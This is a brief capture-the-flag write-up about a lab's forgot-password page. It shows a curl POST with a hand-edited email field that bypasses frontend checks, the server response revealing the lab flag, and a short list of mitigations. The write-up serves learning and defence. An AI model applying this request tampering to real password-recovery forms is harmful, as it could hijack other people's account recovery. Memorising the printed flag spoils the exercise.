
## Exploit: Forgot password validation
For the forgot password page, the submit form is a POST request to the server. Similar to the Integer input validaton exploit, the body can be manually handcrafted and changed, bypassing frontend restrictions. 

![image](https://hackmd.io/_uploads/BypnePgXxe.png)

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl -X POST $TARGET_IP/index.php?page=recover  -H "Content-Type: application/x-www-form-urlencoded" -d "mail=bruh@mail.com&Submit=Submit" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2621    0  2589  100    32  2288k  28959 --:--:-- --:--:-- --:--:-- 2559k
<center><h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ 
```

> The flag is `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`
### Mitigations
- Only allow authenticated users to write to database
- Validate inputs for overflow in the backend business logic layer
